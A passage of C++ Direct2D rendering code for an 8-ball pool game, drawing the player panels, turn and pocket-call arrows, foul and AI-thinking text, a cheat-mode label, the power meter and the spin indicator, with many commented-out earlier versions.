                finalLineEnd.y + sinf(reflectAngle) * reflectionLength
            );

            // Draw the reflection line (e.g., using a different color/style)
            pRT->DrawLine(finalLineEnd, reflectionEnd, pReflectBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);
        }

        // Release resources
        SafeRelease(&pBrush);
        SafeRelease(&pGhostBrush);
        SafeRelease(&pCueBrush);
        SafeRelease(&pReflectBrush); // Release new brush
        SafeRelease(&pCyanBrush);
        SafeRelease(&pPurpleBrush);
        SafeRelease(&pDashedStyle);
    }


    void DrawUI(ID2D1RenderTarget* pRT) {
        if (!pTextFormat || !pLargeTextFormat) return;

        ID2D1SolidColorBrush* pBrush = nullptr;
        pRT->CreateSolidColorBrush(UI_TEXT_COLOR, &pBrush);
        if (!pBrush) return;

        //new code
        // --- Always draw AI's 8?Ball call arrow when it's Player?2's turn and AI has called ---
        //if (isPlayer2AI && currentPlayer == 2 && calledPocketP2 >= 0) {
            // FIX: This condition correctly shows the AI's called pocket arrow.
        if (isPlayer2AI && IsPlayerOnEightBall(2) && calledPocketP2 >= 0) {
            // pocket index that AI called
            int idx = calledPocketP2;
            // draw large blue arrow
            ID2D1SolidColorBrush* pArrow = nullptr;
            pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrow);
            if (pArrow) {
                auto P = pocketPositions[idx];
                D2D1_POINT_2F tri[3] = {
                    { P.x - 15.0f, P.y - 40.0f },
                    { P.x + 15.0f, P.y - 40.0f },
                    { P.x       , P.y - 10.0f }
                };
                ID2D1PathGeometry* geom = nullptr;
                pFactory->CreatePathGeometry(&geom);
                ID2D1GeometrySink* sink = nullptr;
                geom->Open(&sink);
                sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
                sink->AddLines(&tri[1], 2);
                sink->EndFigure(D2D1_FIGURE_END_CLOSED);
                sink->Close();
                pRT->FillGeometry(geom, pArrow);
                SafeRelease(&sink);
                SafeRelease(&geom);
                SafeRelease(&pArrow);
            }
            // draw “Choose a pocket...” prompt
            D2D1_RECT_F txt = D2D1::RectF(
                TABLE_LEFT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
                TABLE_RIGHT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
            );
            pRT->DrawText(
                L""AI has called this pocket"",
                (UINT32)wcslen(L""AI has called this pocket""),
                pTextFormat,
                &txt,
                pBrush
            );
            // note: no return here — we still draw fouls/turn text underneath
        }
        //end new code

        // --- Player Info Area (Top Left/Right) --- (Unchanged)
        float uiTop = TABLE_TOP - 80;
        float uiHeight = 60;
        float p1Left = TABLE_LEFT;
        float p1Width = 150;
        float p2Left = TABLE_RIGHT - p1Width;
        D2D1_RECT_F p1Rect = D2D1::RectF(p1Left, uiTop, p1Left + p1Width, uiTop + uiHeight);
        D2D1_RECT_F p2Rect = D2D1::RectF(p2Left, uiTop, p2Left + p1Width, uiTop + uiHeight);

        // Player 1 Info Text (Unchanged)
        std::wostringstream oss1;
        oss1 << player1Info.name.c_str() << L""\n"";
        if (player1Info.assignedType != BallType::NONE) {
            oss1 << ((player1Info.assignedType == BallType::SOLID) ? L""Solids (Yellow)"" : L""Stripes (Red)"");
            oss1 << L"" ["" << player1Info.ballsPocketedCount << L""/7]"";
        }
        else {
            oss1 << L""(Undecided)"";
        }
        pRT->DrawText(oss1.str().c_str(), (UINT32)oss1.str().length(), pTextFormat, &p1Rect, pBrush);
        // Draw Player 1 Side Ball
        if (player1Info.assignedType != BallType::NONE)
        {
            ID2D1SolidColorBrush* pBallBrush = nullptr;
            D2D1_COLOR_F ballColor = (player1Info.assignedType == BallType::SOLID) ?
                D2D1::ColorF(1.0f, 1.0f, 0.0f) : D2D1::ColorF(1.0f, 0.0f, 0.0f);
            pRT->CreateSolidColorBrush(ballColor, &pBallBrush);
            if (pBallBrush)
            {
                D2D1_POINT_2F ballCenter = D2D1::Point2F(p1Rect.right + 10.0f, p1Rect.top + 20.0f);
                float radius = 10.0f;
                D2D1_ELLIPSE ball = D2D1::Ellipse(ballCenter, radius, radius);
                pRT->FillEllipse(&ball, pBallBrush);
                SafeRelease(&pBallBrush);
                // Draw border around the ball
                ID2D1SolidColorBrush* pBorderBrush = nullptr;
                pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);
                if (pBorderBrush)
                {
                    pRT->DrawEllipse(&ball, pBorderBrush, 1.5f); // thin border
                    SafeRelease(&pBorderBrush);
                }

                // If stripes, draw a stripe band
                if (player1Info.assignedType == BallType::STRIPE)
                {
                    ID2D1SolidColorBrush* pStripeBrush = nullptr;
                    pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);
                    if (pStripeBrush)
                    {
                        D2D1_RECT_F stripeRect = D2D1::RectF(
                            ballCenter.x - radius,
                            ballCenter.y - 3.0f,
                            ballCenter.x + radius,
                            ballCenter.y + 3.0f
                        );
                        pRT->FillRectangle(&stripeRect, pStripeBrush);
                        SafeRelease(&pStripeBrush);
                    }
                }
            }
        }


        // Player 2 Info Text (Unchanged)
        std::wostringstream oss2;
        oss2 << player2Info.name.c_str() << L""\n"";
        if (player2Info.assignedType != BallType::NONE) {
            oss2 << ((player2Info.assignedType == BallType::SOLID) ? L""Solids (Yellow)"" : L""Stripes (Red)"");
            oss2 << L"" ["" << player2Info.ballsPocketedCount << L""/7]"";
        }
        else {
            oss2 << L""(Undecided)"";
        }
        pRT->DrawText(oss2.str().c_str(), (UINT32)oss2.str().length(), pTextFormat, &p2Rect, pBrush);
        // Draw Player 2 Side Ball
        if (player2Info.assignedType != BallType::NONE)
        {
            ID2D1SolidColorBrush* pBallBrush = nullptr;
            D2D1_COLOR_F ballColor = (player2Info.assignedType == BallType::SOLID) ?
                D2D1::ColorF(1.0f, 1.0f, 0.0f) : D2D1::ColorF(1.0f, 0.0f, 0.0f);
            pRT->CreateSolidColorBrush(ballColor, &pBallBrush);
            if (pBallBrush)
            {
                D2D1_POINT_2F ballCenter = D2D1::Point2F(p2Rect.right + 10.0f, p2Rect.top + 20.0f);
                float radius = 10.0f;
                D2D1_ELLIPSE ball = D2D1::Ellipse(ballCenter, radius, radius);
                pRT->FillEllipse(&ball, pBallBrush);
                SafeRelease(&pBallBrush);
                // Draw border around the ball
                ID2D1SolidColorBrush* pBorderBrush = nullptr;
                pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);
                if (pBorderBrush)
                {
                    pRT->DrawEllipse(&ball, pBorderBrush, 1.5f); // thin border
                    SafeRelease(&pBorderBrush);
                }

                // If stripes, draw a stripe band
                if (player2Info.assignedType == BallType::STRIPE)
                {
                    ID2D1SolidColorBrush* pStripeBrush = nullptr;
                    pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);
                    if (pStripeBrush)
                    {
                        D2D1_RECT_F stripeRect = D2D1::RectF(
                            ballCenter.x - radius,
                            ballCenter.y - 3.0f,
                            ballCenter.x + radius,
                            ballCenter.y + 3.0f
                        );
                        pRT->FillRectangle(&stripeRect, pStripeBrush);
                        SafeRelease(&pStripeBrush);
                    }
                }
            }
        }

        // --- MODIFIED: Current Turn Arrow (Blue, Bigger, Beside Name) ---
        ID2D1SolidColorBrush* pArrowBrush = nullptr;
        pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrowBrush);
        if (pArrowBrush && currentGameState != GAME_OVER && currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
            float arrowSizeBase = 32.0f; // Base size for width/height offsets (4x original ~8)
            float arrowCenterY = p1Rect.top + uiHeight / 2.0f; // Center vertically with text box
            float arrowTipX, arrowBackX;

            D2D1_RECT_F playerBox = (currentPlayer == 1) ? p1Rect : p2Rect;
            arrowBackX = playerBox.left - 25.0f;
            arrowTipX = arrowBackX + arrowSizeBase * 0.75f;

            float notchDepth = 12.0f;  // Increased from 6.0f to make the rectangle longer
            float notchWidth = 10.0f;

            float cx = arrowBackX;
            float cy = arrowCenterY;

            // Define triangle + rectangle tail shape
            D2D1_POINT_2F tip = D2D1::Point2F(arrowTipX, cy);                           // tip
            D2D1_POINT_2F baseTop = D2D1::Point2F(cx, cy - arrowSizeBase / 2.0f);          // triangle top
            D2D1_POINT_2F baseBot = D2D1::Point2F(cx, cy + arrowSizeBase / 2.0f);          // triangle bottom

            // Rectangle coordinates for the tail portion:
            D2D1_POINT_2F r1 = D2D1::Point2F(cx - notchDepth, cy - notchWidth / 2.0f);   // rect top-left
            D2D1_POINT_2F r2 = D2D1::Point2F(cx, cy - notchWidth / 2.0f);                 // rect top-right
            D2D1_POINT_2F r3 = D2D1::Point2F(cx, cy + notchWidth / 2.0f);                 // rect bottom-right
            D2D1_POINT_2F r4 = D2D1::Point2F(cx - notchDepth, cy + notchWidth / 2.0f);    // rect bottom-left

            ID2D1PathGeometry* pPath = nullptr;
            if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
                ID2D1GeometrySink* pSink = nullptr;
                if (SUCCEEDED(pPath->Open(&pSink))) {
                    pSink->BeginFigure(tip, D2D1_FIGURE_BEGIN_FILLED);
                    pSink->AddLine(baseTop);
                    pSink->AddLine(r2); // transition from triangle into rectangle
                    pSink->AddLine(r1);
                    pSink->AddLine(r4);
                    pSink->AddLine(r3);
                    pSink->AddLine(baseBot);
                    pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
                    pSink->Close();
                    SafeRelease(&pSink);
                    pRT->FillGeometry(pPath, pArrowBrush);
                }
                SafeRelease(&pPath);
            }


            SafeRelease(&pArrowBrush);
        }

        //original
    /*
        // --- MODIFIED: Current Turn Arrow (Blue, Bigger, Beside Name) ---
        ID2D1SolidColorBrush* pArrowBrush = nullptr;
        pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrowBrush);
        if (pArrowBrush && currentGameState != GAME_OVER && currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
            float arrowSizeBase = 32.0f; // Base size for width/height offsets (4x original ~8)
            float arrowCenterY = p1Rect.top + uiHeight / 2.0f; // Center vertically with text box
            float arrowTipX, arrowBackX;

            if (currentPlayer == 1) {
    arrowBackX = p1Rect.left - 25.0f; // Position left of the box
                arrowTipX = arrowBackX + arrowSizeBase * 0.75f; // Pointy end extends right
                // Define points for right-pointing arrow
                //D2D1_POINT_2F pt1 = D2D1::Point2F(arrowTipX, arrowCenterY); // Tip
                //D2D1_POINT_2F pt2 = D2D1::Point2F(arrowBackX, arrowCenterY - arrowSizeBase / 2.0f); // Top-Back
                //D2D1_POINT_2F pt3 = D2D1::Point2F(arrowBackX, arrowCenterY + arrowSizeBase / 2.0f); // Bottom-Back
                // Enhanced arrow with base rectangle intersection
        float notchDepth = 6.0f; // Depth of square base ""stem""
        float notchWidth = 4.0f; // Thickness of square part

        D2D1_POINT_2F pt1 = D2D1::Point2F(arrowTipX, arrowCenterY); // Tip
        D2D1_POINT_2F pt2 = D2D1::Point2F(arrowBackX, arrowCenterY - arrowSizeBase / 2.0f); // Top-Back
        D2D1_POINT_2F pt3 = D2D1::Point2F(arrowBackX - notchDepth, arrowCenterY - notchWidth / 2.0f); // Square Left-Top
        D2D1_POINT_2F pt4 = D2D1::Point2F(arrowBackX - notchDepth, arrowCenterY + notchWidth / 2.0f); // Square Left-Bottom
        D2D1_POINT_2F pt5 = D2D1::Point2F(arrowBackX, arrowCenterY + arrowSizeBase / 2.0f); // Bottom-Back


        ID2D1PathGeometry* pPath = nullptr;
        if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
            ID2D1GeometrySink* pSink = nullptr;
            if (SUCCEEDED(pPath->Open(&pSink))) {
                pSink->BeginFigure(pt1, D2D1_FIGURE_BEGIN_FILLED);
                pSink->AddLine(pt2);
                pSink->AddLine(pt3);
                pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
                pSink->Close();
                SafeRelease(&pSink);
                pRT->FillGeometry(pPath, pArrowBrush);
            }
            SafeRelease(&pPath);
        }
            }


            //==================else player 2
            else { // Player 2
             // Player 2: Arrow left of P2 box, pointing right (or right of P2 box pointing left?)
             // Let's keep it consistent: Arrow left of the active player's box, pointing right.
    // Let's keep it consistent: Arrow left of the active player's box, pointing right.
    arrowBackX = p2Rect.left - 25.0f; // Position left of the box
    arrowTipX = arrowBackX + arrowSizeBase * 0.75f; // Pointy end extends right
    // Define points for right-pointing arrow
    D2D1_POINT_2F pt1 = D2D1::Point2F(arrowTipX, arrowCenterY); // Tip
    D2D1_POINT_2F pt2 = D2D1::Point2F(arrowBackX, arrowCenterY - arrowSizeBase / 2.0f); // Top-Back
    D2D1_POINT_2F pt3 = D2D1::Point2F(arrowBackX, arrowCenterY + arrowSizeBase / 2.0f); // Bottom-Back

    ID2D1PathGeometry* pPath = nullptr;
    if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
        ID2D1GeometrySink* pSink = nullptr;
        if (SUCCEEDED(pPath->Open(&pSink))) {
            pSink->BeginFigure(pt1, D2D1_FIGURE_BEGIN_FILLED);
            pSink->AddLine(pt2);
            pSink->AddLine(pt3);
            pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
            pSink->Close();
            SafeRelease(&pSink);
            pRT->FillGeometry(pPath, pArrowBrush);
        }
        SafeRelease(&pPath);
    }
            }
            */


            // --- Persistent Blue 8?Ball Call Arrow & Prompt ---
        /*if (calledPocketP1 >= 0 || calledPocketP2 >= 0)
        {
            // determine index (default top?right)
            int idx = (currentPlayer == 1 ? calledPocketP1 : calledPocketP2);
            if (idx < 0) idx = (currentPlayer == 1 ? calledPocketP2 : calledPocketP1);
            if (idx < 0) idx = 2;

            // draw large blue arrow
            ID2D1SolidColorBrush* pArrow = nullptr;
            pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrow);
            if (pArrow) {
                auto P = pocketPositions[idx];
                D2D1_POINT_2F tri[3] = {
                    {P.x - 15.0f, P.y - 40.0f},
                    {P.x + 15.0f, P.y - 40.0f},
                    {P.x       , P.y - 10.0f}
                };
                ID2D1PathGeometry* geom = nullptr;
                pFactory->CreatePathGeometry(&geom);
                ID2D1GeometrySink* sink = nullptr;
                geom->Open(&sink);
                sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
                sink->AddLines(&tri[1], 2);
                sink->EndFigure(D2D1_FIGURE_END_CLOSED);
                sink->Close();
                pRT->FillGeometry(geom, pArrow);
                SafeRelease(&sink); SafeRelease(&geom); SafeRelease(&pArrow);
            }

            // draw prompt
            D2D1_RECT_F txt = D2D1::RectF(
                TABLE_LEFT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
                TABLE_RIGHT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
            );
            pRT->DrawText(
                L""Choose a pocket..."",
                (UINT32)wcslen(L""Choose a pocket...""),
                pTextFormat,
                &txt,
                pBrush
            );
        }*/

        // --- Persistent Blue 8?Ball Pocket Arrow & Prompt (once called) ---
    /* if (calledPocketP1 >= 0 || calledPocketP2 >= 0)
    {
        // 1) Determine pocket index
        int idx = (currentPlayer == 1 ? calledPocketP1 : calledPocketP2);
        // If the other player had called but it's now your turn, still show that call
        if (idx < 0) idx = (currentPlayer == 1 ? calledPocketP2 : calledPocketP1);
        if (idx < 0) idx = 2; // default to top?right if somehow still unset

        // 2) Draw large blue arrow
        ID2D1SolidColorBrush* pArrow = nullptr;
        pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrow);
        if (pArrow) {
            auto P = pocketPositions[idx];
            D2D1_POINT_2F tri[3] = {
                { P.x - 15.0f, P.y - 40.0f },
                { P.x + 15.0f, P.y - 40.0f },
                { P.x       , P.y - 10.0f }
            };
            ID2D1PathGeometry* geom = nullptr;
            pFactory->CreatePathGeometry(&geom);
            ID2D1GeometrySink* sink = nullptr;
            geom->Open(&sink);
            sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
            sink->AddLines(&tri[1], 2);
            sink->EndFigure(D2D1_FIGURE_END_CLOSED);
            sink->Close();
            pRT->FillGeometry(geom, pArrow);
            SafeRelease(&sink);
            SafeRelease(&geom);
            SafeRelease(&pArrow);
        }

        // 3) Draw persistent prompt text
        D2D1_RECT_F txt = D2D1::RectF(
            TABLE_LEFT,
            TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
            TABLE_RIGHT,
            TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
        );
        pRT->DrawText(
            L""Choose a pocket..."",
            (UINT32)wcslen(L""Choose a pocket...""),
            pTextFormat,
            &txt,
            pBrush
        );
        // Note: no 'return'; allow foul/turn text to draw beneath if needed
    } */

    // new code ends here

        // --- MODIFIED: Foul Text (Large Red, Bottom Center) ---
        if (foulCommitted && currentGameState != SHOT_IN_PROGRESS) {
            ID2D1SolidColorBrush* pFoulBrush = nullptr;
            pRT->CreateSolidColorBrush(FOUL_TEXT_COLOR, &pFoulBrush);
            if (pFoulBrush && pLargeTextFormat) {
                // Calculate Rect for bottom-middle area
                float foulWidth = 200.0f; // Adjust width as needed
                float foulHeight = 60.0f;
                float foulLeft = TABLE_LEFT + (TABLE_WIDTH / 2.0f) - (foulWidth / 2.0f);
                // Position below the pocketed balls bar
                float foulTop = pocketedBallsBarRect.bottom + 10.0f;
                D2D1_RECT_F foulRect = D2D1::RectF(foulLeft, foulTop, foulLeft + foulWidth, foulTop + foulHeight);

                // --- Set text alignment to center for foul text ---
                pLargeTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
                pLargeTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);

                pRT->DrawText(L""FOUL!"", 5, pLargeTextFormat, &foulRect, pFoulBrush);

                // --- Restore default alignment for large text if needed elsewhere ---
                // pLargeTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING);
                // pLargeTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);

                SafeRelease(&pFoulBrush);
            }
        }

        // --- Blue Arrow & Prompt for 8?Ball Call (while choosing or after called) ---
        if ((currentGameState == CHOOSING_POCKET_P1
            || currentGameState == CHOOSING_POCKET_P2)
            || (calledPocketP1 >= 0 || calledPocketP2 >= 0))
        {
            // determine index:
            //  - if a call exists, use it
            //  - if still choosing, use hover if any
            // determine index: use only the clicked call; default to top?right if unset
            int idx = (currentPlayer == 1 ? calledPocketP1 : calledPocketP2);
            if (idx < 0) idx = 2;

            // draw large blue arrow
            ID2D1SolidColorBrush* pArrow = nullptr;
            pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrow);
            if (pArrow) {
                auto P = pocketPositions[idx];
                D2D1_POINT_2F tri[3] = {
                    {P.x - 15.0f, P.y - 40.0f},
                    {P.x + 15.0f, P.y - 40.0f},
                    {P.x       , P.y - 10.0f}
                };
                ID2D1PathGeometry* geom = nullptr;
                pFactory->CreatePathGeometry(&geom);
                ID2D1GeometrySink* sink = nullptr;
                geom->Open(&sink);
                sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
                sink->AddLines(&tri[1], 2);
                sink->EndFigure(D2D1_FIGURE_END_CLOSED);
                sink->Close();
                pRT->FillGeometry(geom, pArrow);
                SafeRelease(&sink); SafeRelease(&geom); SafeRelease(&pArrow);
            }

            // draw prompt below pockets
            D2D1_RECT_F txt = D2D1::RectF(
                TABLE_LEFT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
                TABLE_RIGHT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
            );
            pRT->DrawText(
                L""Choose a pocket..."",
                (UINT32)wcslen(L""Choose a pocket...""),
                pTextFormat,
                &txt,
                pBrush
            );
            // do NOT return here; allow foul/turn text to display under the arrow
        }

        // Removed Obsolete
        /*
        // --- 8-Ball Pocket Selection Arrow & Prompt ---
        if (currentGameState == CHOOSING_POCKET_P1 || currentGameState == CHOOSING_POCKET_P2) {
            // Determine which pocket to highlight (default to Top-Right if unset)
            int idx = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
            if (idx < 0) idx = 2;

            // Draw the downward arrow
            ID2D1SolidColorBrush* pArrowBrush = nullptr;
            pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrowBrush);
            if (pArrowBrush) {
                D2D1_POINT_2F P = pocketPositions[idx];
                D2D1_POINT_2F tri[3] = {
                    {P.x - 10.0f, P.y - 30.0f},
                    {P.x + 10.0f, P.y - 30.0f},
                    {P.x        , P.y - 10.0f}
                };
                ID2D1PathGeometry* geom = nullptr;
                pFactory->CreatePathGeometry(&geom);
                ID2D1GeometrySink* sink = nullptr;
                geom->Open(&sink);
                sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
                sink->AddLines(&tri[1], 2);
                sink->EndFigure(D2D1_FIGURE_END_CLOSED);
                sink->Close();
                pRT->FillGeometry(geom, pArrowBrush);
                SafeRelease(&sink);
                SafeRelease(&geom);
                SafeRelease(&pArrowBrush);
            }

            // Draw “Choose a pocket...” text under the table
            D2D1_RECT_F prompt = D2D1::RectF(
                TABLE_LEFT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
                TABLE_RIGHT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
            );
            pRT->DrawText(
                L""Choose a pocket..."",
                (UINT32)wcslen(L""Choose a pocket...""),
                pTextFormat,
                &prompt,
                pBrush
            );

            return; // Skip normal turn/foul text
        }
        */


        // Show AI Thinking State (Unchanged from previous step)
        if (currentGameState == AI_THINKING && pTextFormat) {
            ID2D1SolidColorBrush* pThinkingBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Orange), &pThinkingBrush);
            if (pThinkingBrush) {
                D2D1_RECT_F thinkingRect = p2Rect;
                thinkingRect.top += 20; // Offset within P2 box
                // Ensure default text alignment for this
                pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
                pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
                pRT->DrawText(L""Thinking..."", 11, pTextFormat, &thinkingRect, pThinkingBrush);
                SafeRelease(&pThinkingBrush);
            }
        }

        SafeRelease(&pBrush);

        // --- Draw CHEAT MODE label if active ---
        if (cheatModeEnabled) {
            ID2D1SolidColorBrush* pCheatBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Red), &pCheatBrush);
            if (pCheatBrush && pTextFormat) {
                D2D1_RECT_F cheatTextRect = D2D1::RectF(
                    TABLE_LEFT + 10.0f,
                    TABLE_TOP + 10.0f,
                    TABLE_LEFT + 200.0f,
                    TABLE_TOP + 40.0f
                );
                pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING);
                pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_NEAR);
                pRT->DrawText(L""CHEAT MODE ON"", wcslen(L""CHEAT MODE ON""), pTextFormat, &cheatTextRect, pCheatBrush);
            }
            SafeRelease(&pCheatBrush);
        }
    }

    void DrawPowerMeter(ID2D1RenderTarget* pRT) {
        // Draw Border
        ID2D1SolidColorBrush* pBorderBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);
        if (!pBorderBrush) return;
        pRT->DrawRectangle(&powerMeterRect, pBorderBrush, 2.0f);
        SafeRelease(&pBorderBrush);

        // Create Gradient Fill
        ID2D1GradientStopCollection* pGradientStops = nullptr;
        ID2D1LinearGradientBrush* pGradientBrush = nullptr;
        D2D1_GRADIENT_STOP gradientStops[4];
        gradientStops[0].position = 0.0f;
        gradientStops[0].color = D2D1::ColorF(D2D1::ColorF::Green);
        gradientStops[1].position = 0.45f;
        gradientStops[1].color = D2D1::ColorF(D2D1::ColorF::Yellow);
        gradientStops[2].position = 0.7f;
        gradientStops[2].color = D2D1::ColorF(D2D1::ColorF::Orange);
        gradientStops[3].position = 1.0f;
        gradientStops[3].color = D2D1::ColorF(D2D1::ColorF::Red);

        pRT->CreateGradientStopCollection(gradientStops, 4, &pGradientStops);
        if (pGradientStops) {
            D2D1_LINEAR_GRADIENT_BRUSH_PROPERTIES props = {};
            props.startPoint = D2D1::Point2F(powerMeterRect.left, powerMeterRect.bottom);
            props.endPoint = D2D1::Point2F(powerMeterRect.left, powerMeterRect.top);
            pRT->CreateLinearGradientBrush(props, pGradientStops, &pGradientBrush);
            SafeRelease(&pGradientStops);
        }

        // Calculate Fill Height
        float fillRatio = 0;
        //if (isAiming && (currentGameState == AIMING || currentGameState == BREAKING)) {
            // Determine if power meter should reflect shot power (human aiming or AI preparing)
        bool humanIsAimingPower = isAiming && (currentGameState == AIMING || currentGameState == BREAKING);
        // NEW Condition: AI is displaying its aim, so show its chosen power
        bool aiIsVisualizingPower = (isPlayer2AI && currentPlayer == 2 &&
            currentGameState == AI_THINKING && aiIsDisplayingAim);

        if (humanIsAimingPower || aiIsVisualizingPower) { // Use the new condition
            fillRatio = shotPower / MAX_SHOT_POWER;
        }
        float fillHeight = (powerMeterRect.bottom - powerMeterRect.top) * fillRatio;
        D2D1_RECT_F fillRect = D2D1::RectF(
            powerMeterRect.left,
            powerMeterRect.bottom - fillHeight,
            powerMeterRect.right,
            powerMeterRect.bottom
        );

        if (pGradientBrush) {
            pRT->FillRectangle(&fillRect, pGradientBrush);
            SafeRelease(&pGradientBrush);
        }

        // Draw scale notches
        ID2D1SolidColorBrush* pNotchBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pNotchBrush);
        if (pNotchBrush) {
            for (int i = 0; i <= 8; ++i) {
                float y = powerMeterRect.top + (powerMeterRect.bottom - powerMeterRect.top) * (i / 8.0f);
                pRT->DrawLine(
                    D2D1::Point2F(powerMeterRect.right + 2.0f, y),
                    D2D1::Point2F(powerMeterRect.right + 8.0f, y),
                    pNotchBrush,
                    1.5f
                );
            }
            SafeRelease(&pNotchBrush);
        }

        // Draw ""Power"" Label Below Meter
        if (pTextFormat) {
            ID2D1SolidColorBrush* pTextBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pTextBrush);
            if (pTextBrush) {
                D2D1_RECT_F textRect = D2D1::RectF(
                    powerMeterRect.left - 20.0f,
                    powerMeterRect.bottom + 8.0f,
                    powerMeterRect.right + 20.0f,
                    powerMeterRect.bottom + 38.0f
                );
                pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
                pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_NEAR);
                pRT->DrawText(L""Power"", 5, pTextFormat, &textRect, pTextBrush);
                SafeRelease(&pTextBrush);
            }
        }

        // Draw Glow Effect if fully charged or fading out
        static float glowPulse = 0.0f;
        static bool glowIncreasing = true;
        static float glowFadeOut = 0.0f; // NEW: tracks fading out

        if (shotPower >= MAX_SHOT_POWER * 0.99f) {
            // While fully charged, keep pulsing normally
            if (glowIncreasing) {
                glowPulse += 0.02f;
                if (glowPulse >= 1.0f) glowIncreasing = false;
            }
            else {
                glowPulse -= 0.02f;
                if (glowPulse <= 0.0f) glowIncreasing = true;
            }
            glowFadeOut = 1.0f; // Reset fade out to full
        }
        else if (glowFadeOut > 0.0f) {
            // If shot fired, gradually fade out
            glowFadeOut -= 0.02f;
            if (glowFadeOut < 0.0f) glowFadeOut = 0.0f;
        }

        if (glowFadeOut > 0.0f) {
            ID2D1SolidColorBrush* pGlowBrush = nullptr;
            float effectiveOpacity = (0.3f + 0.7f * glowPulse) * glowFadeOut;
            pRT->CreateSolidColorBrush(
                D2D1::ColorF(D2D1::ColorF::Red, effectiveOpacity),
                &pGlowBrush
            );
            if (pGlowBrush) {
                float glowCenterX = (powerMeterRect.left + powerMeterRect.right) / 2.0f;
                float glowCenterY = powerMeterRect.top;
                D2D1_ELLIPSE glowEllipse = D2D1::Ellipse(
                    D2D1::Point2F(glowCenterX, glowCenterY - 10.0f),
                    12.0f + 3.0f * glowPulse,
                    6.0f + 2.0f * glowPulse
                );
                pRT->FillEllipse(&glowEllipse, pGlowBrush);
                SafeRelease(&pGlowBrush);
            }
        }
    }

    void DrawSpinIndicator(ID2D1RenderTarget* pRT) {
        ID2D1SolidColorBrush* pWhiteBrush = nullptr;
        ID2D1SolidColorBrush* pRedBrush = nullptr;

        pRT->CreateSolidColorBrush(CUE_BALL_COLOR, &pWhiteBrush);
        pRT->CreateSolidColorBrush(ENGLISH_DOT_COLOR, &pRedBrush);

        if (!pWhiteBrush || !pRedBrush) {
            SafeRelease(&pWhiteBrush);
            SafeRelease(&pRedBrush);
            return;
        }

        // Draw White Ball Background
        D2D1_ELLIPSE bgEllipse = D2D1::Ellipse(spinIndicatorCenter, spinIndicatorRadius, spinIndicatorRadius);
        pRT->FillEllipse(&bgEllipse, pWhiteBrush);
        pRT->DrawEllipse(&bgEllipse, pRedBrush, 0.5f); // Thin red border


        // Draw Red Dot for Spin Position
        float dotRadius = 4.0f;
        float dotX = spinIndicatorCenter.x + cueSpinX * (spinIndicatorRadius - dotRadius); // Keep dot inside edge
        float dotY = spinIndicatorCenter.y + cueSpinY * (spinIndicatorRadius - dotRadius);
        D2D1_ELLIPSE dotEllipse = D2D1::Ellipse(D2D1::Point2F(dotX, dotY), dotRadius, dotRadius);
        pRT->FillEllipse(&dotEllipse, pRedBrush);

        SafeRelease(&pWhiteBrush);
        SafeRelease(&pRedBrush);
    }


    void DrawPocketedBallsIndicator(ID2D1RenderTarget* pRT) {
        ID2D1SolidColorBrush* pBgBrush = nullptr;
        ID2D1SolidColorBrush* pBallBrush = nullptr;

